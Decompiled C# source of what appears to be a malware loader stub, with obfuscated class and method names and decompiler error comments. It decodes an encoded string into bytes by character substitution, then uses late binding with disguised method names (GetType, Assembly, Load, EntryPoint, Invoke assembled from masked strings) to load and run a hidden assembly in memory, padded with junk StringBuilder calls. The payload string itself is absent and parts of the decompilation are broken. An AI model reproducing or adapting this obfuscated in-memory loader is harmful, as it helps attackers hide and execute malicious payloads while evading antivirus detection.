using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

public sealed class GClass0
{
	public class GClass1
	{
		private string string_0;

		private string string_1;

		private string string_2;

		private object object_0;

		public GClass1()
		{
			string_0 = "0123456789";
			string_1 = ",GRuEhW\u00b4Kn";
			object_0 = null;
		}

		public void method_0()
		{
			//IL_00b9: Incompatible stack heights: 1 vs 0
			//IL_00c5: Incompatible stack heights: 0 vs 1
			_ = (object)(FormCollection)/*Error near IL_0005: Stack underflow*/;
			new StringBuilder();
			new StringBuilder();
			new StringBuilder();
			new StringBuilder();
			new StringBuilder();
			new StringBuilder();
			new StringBuilder();
			MemoryStream memoryStream = new MemoryStream();
			checked
			{
				int num = string_0.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					string_2 = Strings.Replace(string_2, Conversions.ToString(string_1[i]), Conversions.ToString(string_0[i]), 1, -1, (CompareMethod)0);
				}
				string[] array = string_2.Split(new char[1] { 'x' });
				foreach (string text in array)
				{
					memoryStream.WriteByte(Conversions.ToByte(text));
				}
				byte[] array2 = memoryStream.ToArray();
				new StringBuilder();
				new StringBuilder();
				object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object)array2, (Type)object_0, Strings.Replace("G+tTyp+", "+", "e", 1, -1, (CompareMethod)0), (object[])object_0, (string[])object_0, (Type[])object_0, (bool[])object_0));
				object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), (Type)object_0, Strings.Replace("Ass+mbly", "+", "e", 1, -1, (CompareMethod)0), (object[])object_0, (string[])object_0, (Type[])object_0, (bool[])object_0));
				object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue2), (Type)object_0, Strings.Replace("L+ad", "+", "o", 1, -1, (CompareMethod)0), new object[1] { array2 }, (string[])object_0, (Type[])object_0, (bool[])object_0));
				object objectValue4 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue3), (Type)object_0, Strings.Replace("+ntryPoint", "+", "E", 1, -1, (CompareMethod)0), (object[])object_0, (string[])object_0, (Type[])object_0, (bool[])object_0));
				NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue4), (Type)object_0, Strings.Replace("^nvoke", "^", "I", 1, -1, (CompareMethod)0), new object[2] { object_0, object_0 }, (string[])object_0, (Type[])object_0, (bool[])object_0, true);
				new StringBuilder();
				new StringBuilder();
				new StringBuilder();
				new StringBuilder();
				new StringBuilder();
			}
		}
	}

	private static void Main()
	{
		_ = (object)(FormCollection)/*Error near IL_0005: Stack underflow*/;
		GClass1 gClass = new GClass1();
		gClass.method_0();
	}
}